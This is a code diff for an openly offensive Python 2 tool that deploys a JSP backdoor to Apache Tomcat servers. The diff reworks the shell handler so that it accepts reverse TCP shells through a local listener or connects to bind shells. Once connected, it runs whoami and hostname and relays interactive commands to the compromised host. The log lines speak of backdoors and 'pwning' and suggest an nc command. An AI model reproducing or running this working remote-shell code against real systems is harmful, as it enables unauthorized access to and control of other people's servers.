@@ -62,38 +62,116 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
-def shellHandler(mode, host, opts):
+def shellHandler(mode, hostn, opts):
     logger.debug('Spawned shell handling thread. Awaiting for the event...')
-    SHELLEVENT.wait()
     time.sleep(int(opts.timeout) / 10)
 
-    if mode == 1:
-        # if Reverse TCP - firstly establish listener, then invoke application.
-        establishReverseTcpListener(opts)
-
-    if mode == 2:
-        # If Bind TCP - firstly invoke application, then connect back to it.
-        connectToBindShell(host, opts)
-    
-
-def establishReverseTcpListener(opts):
-    logger.debug('Establishing listener for incoming reverse TCP shell...')
-
-def connectToBindShell(hostn, opts):
     portpos = hostn.find(':')
     host = hostn[:portpos]
     if '/' in host:
         host = host[host.find('/')+1:host.rfind('/')]
 
-    logger.debug('Shell is to be binded to %s:%s. Connecting back to it...' % (host, opts.port))
-
     sock = None
+    serv = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(int(opts.timeout))
     except socket.error, e:
         logger.error("Creating socket for bind-shell client failed: '%s'" % e)
         return False
+
+    if mode == 0:
+        logger.error("Neither reverse nor bind mode occured, out of blue.")
+        sock.close()
+        return False
+    elif mode == 1:
+        serv = sock
+        sock = establishReverseTcpListener(serv, host, opts)
+        if not sock:
+            logger.error("Could not establish local TCP listener.")
+            serv.close()
+            return False
+        else:
+            sock.setblocking(1)
+    elif mode == 2:
+        if not connectToBindShell(sock, host, opts):
+            logger.error("Could not connect to remote bind-shell.")
+            sock.close()
+            return False
+    
+    try:
+        sock.send('whoami\n')
+        whoami = sock.recv(RECVSIZE).strip()
+        sock.send('hostname\n')
+        hostname = sock.recv(RECVSIZE).strip()
+    except (socket.gaierror, socket.error) as e:
+        logger.error("Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
+        return False
+
+    logger.debug('Connected with the shell: %s@%s' % (whoami, hostname))
+    sock.settimeout(0)
+    sock.setblocking(1)
+    SHELLSTATUS.set()
+
+    if len(whoami) == 0:
+        whoami = 'tomcat'
+    if len(hostname) == 0:
+        hostname = host
+
+    try:
+        while True:
+            command = raw_input("\n%s@%s $ " % (whoami, hostname))
+            if not command: continue
+            if command.lower() == 'exit' or command.lower() == 'quit':
+                sock.close()
+                if serv: serv.close()
+                break
+
+            sock.send(command + '\n')
+            res = sock.recv(RECVSIZE).strip()
+
+            if not len(res) and len(command):
+                sock.close()
+                if serv: serv.close()
+                break
+
+            print res
+
+    except KeyboardInterrupt:
+        sock.shutdown(0)
+        SHELLSTATUS.clear()
+        # Pass it down to the main function's except block.
+        raise KeyboardInterrupt
+
+    SHELLSTATUS.clear()
+    return True
+
+
+def establishReverseTcpListener(sock, host, opts):
+    logger.debug('Establishing listener for incoming reverse TCP shell at %s:%s' % (opts.host, opts.port))
+
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        sock.bind((opts.host, int(opts.port)))
+    except (socket.gaierror, socket.error) as e:
+        logger.error("Establishing local listener failed.\n\tError: '%s'" % e)
+        return False
+
+    logger.debug('Socket is binded to local port now, awaiting for clients...')
+    SHELLEVENT.set()
+    sock.listen(2)
+    try:
+        conn, addr = sock.accept()
+        logger.debug("Incoming client: %s:%s" % (addr[0], addr[1]))
+    except (socket.gaierror, socket.error) as e:
+        logger.error("Remote host did not connected to our handler. Connection failure.")
+        return False
+
+    return conn
+
+def connectToBindShell(sock, host, opts):
+    SHELLEVENT.wait()
+    logger.debug('Shell is to be binded to %s:%s. Connecting back to it...' % (host, opts.port))
 
     retries = 3
     status = False
@@ -110,44 +188,7 @@ def connectToBindShell(hostn, opts):
         logger.error('Connection failed. Quitting due to inability to connect back to bind shell.')
         return False
 
-    try:
-        sock.send('whoami\n')
-        whoami = sock.recv(RECVSIZE).strip()
-        sock.send('hostname\n')
-        hostname = sock.recv(RECVSIZE).strip()
-    except (socket.gaierror, socket.error) as e:
-        logger.error("Initial commands could not be executed. Something is wrong.\n\tError: '%s'" % e)
-        return False
-
-    logger.debug('Connected with the bind-shell: %s@%s' % (whoami, hostname))
-    sock.settimeout(0)
-    sock.setblocking(1)
-    SHELLSTATUS.set()
-
-    try:
-        while True:
-            command = raw_input("\n%s@%s $ " % (whoami, hostname))
-            if not command: continue
-            if command.lower() == 'exit' or command.lower() == 'quit':
-                sock.close()
-                break
-
-            sock.send(command + '\n')
-            res = sock.recv(RECVSIZE).strip()
-
-            if not len(res) and len(command):
-                sock.close()
-                break
-
-            print res
-
-    except KeyboardInterrupt:
-        sock.shutdown(0)
-        SHELLSTATUS.clear()
-        # Pass it down to the main function's except block.
-        raise KeyboardInterrupt
-
-    SHELLSTATUS.clear()
+    return True
 
 
 def generateWAR(code, title, appname):
@@ -421,7 +462,7 @@ def invokeApplication(browser, url, opts):
             elif mode == 2:
                 logger.warning("Shell has been binded. Go and connect back to it!")
                 logger.warning("How about: \t$ nc %s %s" % (url[:url.find(':')], opts.port))
-        else:
+        elif not opts.noconnect and mode == 2:
             SHELLEVENT.set()
 
         resp = browser.open(appurl)
@@ -718,9 +759,15 @@ def main():
 
             thread = None
             if not opts.noconnect and (mode == 1 or mode == 2):
-                thread = threading.Thread(target=shellHandler, args = (mode, args[0], opts))
+                thread = threading.Thread(target=shellHandler, args=(mode, args[0], opts))
                 thread.daemon = True
                 thread.start()
+                
+                if mode == 1:
+                    logger.debug("Awaiting for reverse-shell handler to set-up")
+                    if not SHELLEVENT.wait(int(opts.timeout) / 5):
+                        logger.error("Could not setup reverse-shell handler.")
+                        return
 
             if invokeApplication(browser, args[0], opts):
                 logger.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
@@ -735,10 +782,9 @@ def main():
                 logger.error("\033[1;41mSorry, no pwning today. Backdoor was not deployed.\033[1;0m")
 
             if thread != None:
-                if not SHELLSTATUS.wait(int(opts.timeout)):
-                    logger.warning('Awaiting for shell handler to bind has timed-out.')
-                    logger.warning('Assuming failure, thereof quitting. Sorry about that...')
-                    SHELLTHREADQUIT = True
+                if not SHELLSTATUS.wait(int(opts.timeout)) and mode != 1:
+                    logger.error('Awaiting for shell handler to bind has timed-out.')
+                    logger.error('Assuming failure, thereof quitting. Sorry about that...')
                 else:
                     while SHELLSTATUS.is_set():
                         pass
